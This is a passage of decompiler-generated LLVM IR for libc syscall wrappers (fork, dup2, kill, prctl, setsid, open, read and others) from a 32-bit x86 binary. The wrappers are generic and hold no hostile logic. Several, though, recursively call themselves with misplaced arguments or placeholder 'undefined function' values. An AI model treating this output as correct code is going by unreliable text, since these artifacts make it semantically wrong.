  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8051f84 = load i32, i32* @ebx, align 4
  %v1_8051f8c = call i32 @close(i32 %arg1)
  store i32 %v0_8051f84, i32* @ebx, align 4
  store i32 %v1_8051f8c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051f8c, -4095
  br i1 %tmp, label %dec_label_pc_8051fa4, label %dec_label_pc_8051f98

dec_label_pc_8051f98:                             ; preds = %entry
  %v1_8051f98 = call i32 @__errno_location(i32 %v0_8051f84)
  %v0_8051f9d = load i32, i32* %edi.global-to-local, align 4
  %v1_8051f9d = sub i32 0, %v0_8051f9d
  %v2_8051f9f = inttoptr i32 %v1_8051f98 to i32*
  store i32 %v1_8051f9d, i32* %v2_8051f9f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051fa4

dec_label_pc_8051fa4:                             ; preds = %entry, %dec_label_pc_8051f98
  %v0_8051fa5 = phi i32 [ %v1_8051f8c, %entry ], [ -1, %dec_label_pc_8051f98 ]
  %v2_8051fa8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051fa8, i32* @edi, align 4
  ret i32 %v0_8051fa5

; uselistorder directives
  uselistorder i32 %v1_8051f8c, { 1, 0, 2 }
  uselistorder i32 %v0_8051f84, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051fa4, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051fac = load i32, i32* @ebx, align 4
  store i32 %v0_8051fac, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8051fbf = call i32 @dup2(i32 %v0_8051fac, i32 %tmp4)
  store i32 %v2_8051fbf, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8051fbf, -4095
  br i1 %tmp, label %dec_label_pc_8051fd8, label %dec_label_pc_8051fcc

dec_label_pc_8051fcc:                             ; preds = %entry
  %v0_8051fcc = load i32, i32* %stack_var_-4, align 4
  %v1_8051fcc = call i32 @__errno_location(i32 %v0_8051fcc)
  %v0_8051fd1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051fd1 = sub i32 0, %v0_8051fd1
  %v2_8051fd3 = inttoptr i32 %v1_8051fcc to i32*
  store i32 %v1_8051fd1, i32* %v2_8051fd3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051fd8

dec_label_pc_8051fd8:                             ; preds = %entry, %dec_label_pc_8051fcc
  %v0_8051fd9 = phi i32 [ %v2_8051fbf, %entry ], [ -1, %dec_label_pc_8051fcc ]
  %v2_8051fdc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051fdc, i32* @ebx, align 4
  ret i32 %v0_8051fd9

; uselistorder directives
  uselistorder i32 %v2_8051fbf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051fd8, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051fe0 = load i32, i32* @ebx, align 4
  store i32 %v0_8051fe0, i32* %stack_var_-4, align 4
  %v1_8051fe9 = call i32 @fork(i32 %v0_8051fe0)
  store i32 %v1_8051fe9, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051fe9, -4095
  br i1 %tmp, label %dec_label_pc_8052000, label %dec_label_pc_8051ff4

dec_label_pc_8051ff4:                             ; preds = %entry
  %v0_8051ff4 = load i32, i32* %stack_var_-4, align 4
  %v1_8051ff4 = call i32 @__errno_location(i32 %v0_8051ff4)
  %v0_8051ff9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051ff9 = sub i32 0, %v0_8051ff9
  %v2_8051ffb = inttoptr i32 %v1_8051ff4 to i32*
  store i32 %v1_8051ff9, i32* %v2_8051ffb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052000

dec_label_pc_8052000:                             ; preds = %entry, %dec_label_pc_8051ff4
  %v0_8052001 = phi i32 [ %v1_8051fe9, %entry ], [ -1, %dec_label_pc_8051ff4 ]
  %v2_8052000 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052000, i32* @edx, align 4
  %v2_8052004 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052004, i32* @ebx, align 4
  ret i32 %v0_8052001

; uselistorder directives
  uselistorder i32 %v1_8051fe9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052000, { 1, 0 }
}

define i32 @getdtablesize(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_805200b = ptrtoint i32* %stack_var_-8 to i32
  %v2_8052012 = call i32 @getrlimit(i32 7, i32 %v2_805200b)
  store i32 256, i32* @edx, align 4
  %v2_805201f = icmp slt i32 %v2_8052012, 0
  br i1 %v2_805201f, label %dec_label_pc_8052027, label %dec_label_pc_8052023

dec_label_pc_8052023:                             ; preds = %entry
  %v3_8052023 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8052023, i32* @edx, align 4
  br label %dec_label_pc_8052027

dec_label_pc_8052027:                             ; preds = %entry, %dec_label_pc_8052023
  %v0_8052027 = phi i32 [ 256, %entry ], [ %v3_8052023, %dec_label_pc_8052023 ]
  ret i32 %v0_8052027

; uselistorder directives
  uselistorder label %dec_label_pc_8052027, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052030 = load i32, i32* @ebx, align 4
  store i32 %v0_8052030, i32* %stack_var_-4, align 4
  %v1_8052039 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8052039, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8052039, -4095
  br i1 %tmp, label %dec_label_pc_8052050, label %dec_label_pc_8052044

dec_label_pc_8052044:                             ; preds = %entry
  %v0_8052044 = load i32, i32* %stack_var_-4, align 4
  %v1_8052044 = call i32 @__errno_location(i32 %v0_8052044)
  %v0_8052049 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052049 = sub i32 0, %v0_8052049
  %v2_805204b = inttoptr i32 %v1_8052044 to i32*
  store i32 %v1_8052049, i32* %v2_805204b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052050

dec_label_pc_8052050:                             ; preds = %entry, %dec_label_pc_8052044
  %v0_8052051 = phi i32 [ %v1_8052039, %entry ], [ -1, %dec_label_pc_8052044 ]
  %v2_8052054 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052054, i32* @ebx, align 4
  ret i32 %v0_8052051

; uselistorder directives
  uselistorder i32 %v1_8052039, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 201, { 1, 0 }
  uselistorder label %dec_label_pc_8052050, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052058 = load i32, i32* @ebx, align 4
  store i32 %v0_8052058, i32* %stack_var_-4, align 4
  %v1_8052061 = call i32 @getpid(i32 %v0_8052058)
  store i32 %v1_8052061, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8052061, -4095
  br i1 %tmp, label %dec_label_pc_8052078, label %dec_label_pc_805206c

dec_label_pc_805206c:                             ; preds = %entry
  %v0_805206c = load i32, i32* %stack_var_-4, align 4
  %v1_805206c = call i32 @__errno_location(i32 %v0_805206c)
  %v0_8052071 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052071 = sub i32 0, %v0_8052071
  %v2_8052073 = inttoptr i32 %v1_805206c to i32*
  store i32 %v1_8052071, i32* %v2_8052073, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052078

dec_label_pc_8052078:                             ; preds = %entry, %dec_label_pc_805206c
  %v0_8052079 = phi i32 [ %v1_8052061, %entry ], [ -1, %dec_label_pc_805206c ]
  %v2_805207c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805207c, i32* @ebx, align 4
  ret i32 %v0_8052079

; uselistorder directives
  uselistorder i32 %v1_8052061, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052078, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052080 = load i32, i32* @ebx, align 4
  store i32 %v0_8052080, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8052093 = call i32 @int80_syscall(i32 191)
  store i32 %v1_8052093, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8052093, -4095
  br i1 %tmp, label %dec_label_pc_80520ac, label %dec_label_pc_80520a0

dec_label_pc_80520a0:                             ; preds = %entry
  %v0_80520a0 = load i32, i32* %stack_var_-4, align 4
  %v1_80520a0 = call i32 @__errno_location(i32 %v0_80520a0)
  %v0_80520a5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80520a5 = sub i32 0, %v0_80520a5
  %v2_80520a7 = inttoptr i32 %v1_80520a0 to i32*
  store i32 %v1_80520a5, i32* %v2_80520a7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80520ac

dec_label_pc_80520ac:                             ; preds = %entry, %dec_label_pc_80520a0
  %v0_80520ad = phi i32 [ %v1_8052093, %entry ], [ -1, %dec_label_pc_80520a0 ]
  %v2_80520b0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80520b0, i32* @ebx, align 4
  ret i32 %v0_80520ad

; uselistorder directives
  uselistorder i32 %v1_8052093, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80520ac, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80520b4 = load i32, i32* @edi, align 4
  store i32 %v0_80520b4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_80520cc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_80520d4 = call i32 @ioctl(i32 %v0_80520cc, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_80520cc, i32* @ebx, align 4
  store i32 %v3_80520d4, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_80520d4, -4095
  br i1 %tmp, label %dec_label_pc_80520ec, label %dec_label_pc_80520e0

dec_label_pc_80520e0:                             ; preds = %entry
  %v1_80520e0 = call i32 @__errno_location(i32 %v0_80520cc)
  %v0_80520e5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80520e5 = sub i32 0, %v0_80520e5
  %v2_80520e7 = inttoptr i32 %v1_80520e0 to i32*
  store i32 %v1_80520e5, i32* %v2_80520e7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80520ec

dec_label_pc_80520ec:                             ; preds = %entry, %dec_label_pc_80520e0
  %v0_80520ef = phi i32 [ %v3_80520d4, %entry ], [ -1, %dec_label_pc_80520e0 ]
  %v2_80520f1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80520f1, i32* @edi, align 4
  ret i32 %v0_80520ef

; uselistorder directives
  uselistorder i32 %v3_80520d4, { 1, 0, 2 }
  uselistorder i32 %v0_80520cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80520ec, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80520f4 = load i32, i32* @ebx, align 4
  store i32 %v0_80520f4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8052107 = call i32 @kill(i32 %v0_80520f4, i32 %tmp4)
  store i32 %v2_8052107, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8052107, -4095
  br i1 %tmp, label %dec_label_pc_8052120, label %dec_label_pc_8052114

dec_label_pc_8052114:                             ; preds = %entry
  %v0_8052114 = load i32, i32* %stack_var_-4, align 4
  %v1_8052114 = call i32 @__errno_location(i32 %v0_8052114)
  %v0_8052119 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052119 = sub i32 0, %v0_8052119
  %v2_805211b = inttoptr i32 %v1_8052114 to i32*
  store i32 %v1_8052119, i32* %v2_805211b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052120

dec_label_pc_8052120:                             ; preds = %entry, %dec_label_pc_8052114
  %v0_8052121 = phi i32 [ %v2_8052107, %entry ], [ -1, %dec_label_pc_8052114 ]
  %v2_8052120 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052120, i32* @edx, align 4
  %v2_8052124 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052124, i32* @ebx, align 4
  ret i32 %v0_8052121

; uselistorder directives
  uselistorder i32 %v2_8052107, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052120, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_805212b = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_805212f = sdiv i32 %sext, 16777216
  store i32 %v4_805212f, i32* @ecx, align 4
  %v4_8052133 = ptrtoint i8* %arg1 to i32
  %v3_8052137 = and i32 %arg2, 64
  %v4_8052137 = icmp eq i32 %v3_8052137, 0
  br i1 %v4_8052137, label %dec_label_pc_8052148, label %dec_label_pc_805213c

dec_label_pc_805213c:                             ; preds = %entry
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_8052148

dec_label_pc_8052148:                             ; preds = %entry, %dec_label_pc_805213c
  %v0_8052148 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_805213c ]
  store i32 %v0_8052148, i32* @edx, align 4
  store i32 %v4_8052133, i32* %ebx.global-to-local, align 4
  %v5_8052153 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_805212f)
  store i32 %v5_8052153, i32* %ebx.global-to-local, align 4
  %tmp16 = icmp ult i32 %v5_8052153, -4095
  br i1 %tmp16, label %dec_label_pc_805216b, label %dec_label_pc_805215f

dec_label_pc_805215f:                             ; preds = %dec_label_pc_8052148
  %v1_805215f = call i32 @__errno_location(i32 %v0_805212b)
  %v0_8052164 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052164 = sub i32 0, %v0_8052164
  %v2_8052166 = inttoptr i32 %v1_805215f to i32*
  store i32 %v1_8052164, i32* %v2_8052166, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805216b

dec_label_pc_805216b:                             ; preds = %dec_label_pc_8052148, %dec_label_pc_805215f
  %v0_805216e = phi i32 [ %v5_8052153, %dec_label_pc_8052148 ], [ -1, %dec_label_pc_805215f ]
  store i32 %v0_805212b, i32* @ebx, align 4
  ret i32 %v0_805216e

; uselistorder directives
  uselistorder i32 %v5_8052153, { 1, 0, 2 }
  uselistorder i32 %v4_805212f, { 1, 0 }
  uselistorder i32 %v0_805212b, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805216b, { 1, 0 }
  uselistorder label %dec_label_pc_8052148, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8052183 = inttoptr i32 %arg1 to i8*
  %v4_8052183 = call i32 @__libc_open(i8* %v3_8052183, i32 577)
  ret i32 %v4_8052183
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805218c = load i32, i32* @edi, align 4
  store i32 %v0_805218c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8052194 = load i32, i32* @ebx, align 4
  %v1_805219c = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_805219c = call i32 @pipe([2 x i32] %v1_805219c)
  store i32 %v0_8052194, i32* @ebx, align 4
  store i32 %v2_805219c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_805219c, -4095
  br i1 %tmp, label %dec_label_pc_80521b4, label %dec_label_pc_80521a8

dec_label_pc_80521a8:                             ; preds = %entry
  %v1_80521a8 = call i32 @__errno_location(i32 %v0_8052194)
  %v0_80521ad = load i32, i32* %edi.global-to-local, align 4
  %v1_80521ad = sub i32 0, %v0_80521ad
  %v2_80521af = inttoptr i32 %v1_80521a8 to i32*
  store i32 %v1_80521ad, i32* %v2_80521af, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80521b4

dec_label_pc_80521b4:                             ; preds = %entry, %dec_label_pc_80521a8
  %v0_80521b5 = phi i32 [ %v2_805219c, %entry ], [ -1, %dec_label_pc_80521a8 ]
  %v2_80521b8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80521b8, i32* @edi, align 4
  ret i32 %v0_80521b5

; uselistorder directives
  uselistorder i32 %v2_805219c, { 1, 0, 2 }
  uselistorder i32 %v0_8052194, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80521b4, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80521bc = load i32, i32* @edi, align 4
  %v0_80521bd = load i32, i32* @esi, align 4
  store i32 %v0_80521bd, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_80521d5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v5_80521dd = call i32 @prctl(i32 %v0_80521d5, i32 %v0_80521bd, i32 %v0_80521bc, i32 %tmp6, i32 %arg1)
  store i32 %v0_80521d5, i32* @ebx, align 4
  store i32 %v5_80521dd, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v5_80521dd, -4095
  br i1 %tmp, label %dec_label_pc_80521f5, label %dec_label_pc_80521e9

dec_label_pc_80521e9:                             ; preds = %entry
  %v1_80521e9 = call i32 @__errno_location(i32 %v0_80521d5)
  %v0_80521ee = load i32, i32* %esi.global-to-local, align 4
  %v1_80521ee = sub i32 0, %v0_80521ee
  %v2_80521f0 = inttoptr i32 %v1_80521e9 to i32*
  store i32 %v1_80521ee, i32* %v2_80521f0, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80521f5

dec_label_pc_80521f5:                             ; preds = %entry, %dec_label_pc_80521e9
  %v0_80521f6 = phi i32 [ %v5_80521dd, %entry ], [ -1, %dec_label_pc_80521e9 ]
  %v2_80521f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80521f8, i32* @esi, align 4
  store i32 %v0_80521bc, i32* @edi, align 4
  ret i32 %v0_80521f6

; uselistorder directives
  uselistorder i32 %v5_80521dd, { 1, 0, 2 }
  uselistorder i32 %v0_80521d5, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @prctl, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80521f5, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80521fc = load i32, i32* @edi, align 4
  store i32 %v0_80521fc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805220c = load i32, i32* @ebx, align 4
  %v4_8052214 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_805220c, i32* @ebx, align 4
  store i32 %v4_8052214, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8052214, -4095
  br i1 %tmp, label %dec_label_pc_805222c, label %dec_label_pc_8052220

dec_label_pc_8052220:                             ; preds = %entry
  %v1_8052220 = call i32 @__errno_location(i32 %v0_805220c)
  %v0_8052225 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052225 = sub i32 0, %v0_8052225
  %v2_8052227 = inttoptr i32 %v1_8052220 to i32*
  store i32 %v1_8052225, i32* %v2_8052227, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805222c

dec_label_pc_805222c:                             ; preds = %entry, %dec_label_pc_8052220
  %v0_805222d = phi i32 [ %v4_8052214, %entry ], [ -1, %dec_label_pc_8052220 ]
  %v2_8052230 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052230, i32* @edi, align 4
  ret i32 %v0_805222d

; uselistorder directives
  uselistorder i32 %v4_8052214, { 1, 0, 2 }
  uselistorder i32 %v0_805220c, { 1, 0 }
  uselistorder label %dec_label_pc_805222c, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052235 = load i32, i32* @esi, align 4
  store i32 %v0_8052235, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805224d = load i32, i32* @ebx, align 4
  %v1_8052255 = call i32 @int80_syscall(i32 142)
  store i32 %v0_805224d, i32* @ebx, align 4
  store i32 %v1_8052255, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8052255, -4095
  br i1 %tmp, label %dec_label_pc_805226d, label %dec_label_pc_8052261

dec_label_pc_8052261:                             ; preds = %entry
  %v1_8052261 = call i32 @__errno_location(i32 %v0_805224d)
  %v0_8052266 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052266 = sub i32 0, %v0_8052266
  %v2_8052268 = inttoptr i32 %v1_8052261 to i32*
  store i32 %v1_8052266, i32* %v2_8052268, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805226d

dec_label_pc_805226d:                             ; preds = %entry, %dec_label_pc_8052261
  %v0_805226e = phi i32 [ %v1_8052255, %entry ], [ -1, %dec_label_pc_8052261 ]
  %v2_805226d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805226d, i32* @edx, align 4
  %v2_8052270 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052270, i32* @esi, align 4
  ret i32 %v0_805226e

; uselistorder directives
  uselistorder i32 %v1_8052255, { 1, 0, 2 }
  uselistorder i32 %v0_805224d, { 1, 0 }
  uselistorder i32 142, { 1, 0 }
  uselistorder label %dec_label_pc_805226d, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052274 = load i32, i32* @ebx, align 4
  store i32 %v0_8052274, i32* %stack_var_-4, align 4
  %v1_805227d = call i32 @setsid(i32 %v0_8052274)
  store i32 %v1_805227d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805227d, -4095
  br i1 %tmp, label %dec_label_pc_8052294, label %dec_label_pc_8052288

dec_label_pc_8052288:                             ; preds = %entry
  %v0_8052288 = load i32, i32* %stack_var_-4, align 4
  %v1_8052288 = call i32 @__errno_location(i32 %v0_8052288)
  %v0_805228d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805228d = sub i32 0, %v0_805228d
  %v2_805228f = inttoptr i32 %v1_8052288 to i32*
  store i32 %v1_805228d, i32* %v2_805228f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052294

dec_label_pc_8052294:                             ; preds = %entry, %dec_label_pc_8052288
  %v0_8052295 = phi i32 [ %v1_805227d, %entry ], [ -1, %dec_label_pc_8052288 ]
  %v2_8052298 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052298, i32* @ebx, align 4
  ret i32 %v0_8052295

; uselistorder directives
  uselistorder i32 %v1_805227d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052294, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_805229d = load i32, i32* @esi, align 4
  %v4_80522a1 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_80522a1, i32* @ecx, align 4
  %v2_80522ad = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_80522ad, label %dec_label_pc_80522c6, label %dec_label_pc_80522b1

dec_label_pc_80522b1:                             ; preds = %entry
  %tmp = icmp ult i32 %arg1, 3
  br i1 %tmp, label %dec_label_pc_80522c6, label %dec_label_pc_80522b6

dec_label_pc_80522b6:                             ; preds = %dec_label_pc_80522b1
  %v1_80522b6 = call i32 @__errno_location(i32 %v0_805229d)
  %v1_80522bb = inttoptr i32 %v1_80522b6 to i32*
  store i32 22, i32* %v1_80522bb, align 4
  store i1 false, i1* @of, align 1
  br label %dec_label_pc_80522ed

dec_label_pc_80522c6:                             ; preds = %dec_label_pc_80522b1, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_80522cb = load i32, i32* @ebx, align 4
  %v7_80522d3 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_80522cb, i32* @ebx, align 4
  %v1_80522d6 = add i32 %v7_80522d3, 4096
  %v2_80522d6 = icmp ult i32 %v7_80522d3, -4096
  %v3_80522d6 = xor i32 %v7_80522d3, -2147483648
  %v4_80522d6 = xor i32 %v1_80522d6, %v7_80522d3
  %v5_80522d6 = and i32 %v4_80522d6, %v3_80522d6
  %v6_80522d6 = icmp slt i32 %v5_80522d6, 0
  store i1 %v6_80522d6, i1* @of, align 1
  %v7_80522d6 = icmp eq i32 %v1_80522d6, 0
  store i32 %v7_80522d3, i32* %esi.global-to-local, align 4
  %v2_80522dd = or i1 %v2_80522d6, %v7_80522d6
  br i1 %v2_80522dd, label %dec_label_pc_80522ed, label %dec_label_pc_80522df

dec_label_pc_80522df:                             ; preds = %dec_label_pc_80522c6
  %v1_80522df = call i32 @__errno_location(i32 %v0_80522cb)
  %v0_80522e4 = load i32, i32* %esi.global-to-local, align 4
  %v1_80522e4 = sub i32 0, %v0_80522e4
  %v2_80522e6 = inttoptr i32 %v1_80522df to i32*
  store i32 %v1_80522e4, i32* %v2_80522e6, align 4
  store i1 false, i1* @of, align 1
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80522ed

dec_label_pc_80522ed:                             ; preds = %dec_label_pc_80522df, %dec_label_pc_80522c6, %dec_label_pc_80522b6
  %storemerge = phi i32 [ -1, %dec_label_pc_80522b6 ], [ %v7_80522d3, %dec_label_pc_80522c6 ], [ -1, %dec_label_pc_80522df ]
  %v2_80522ed = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80522ed, i32* @edx, align 4
  store i32 %v0_805229d, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80522d6, { 1, 0 }
  uselistorder i32 %v7_80522d3, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v0_80522cb, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80522f4 = load i32, i32* @edi, align 4
  store i32 %v0_80522f4, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_80522fc = load i32, i32* @ebx, align 4
  %v2_8052304 = call i32 @time(i32* %arg1)
  store i32 %v0_80522fc, i32* @ebx, align 4
  store i32 %v2_8052304, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8052304, -4095
  br i1 %tmp, label %dec_label_pc_805231c, label %dec_label_pc_8052310

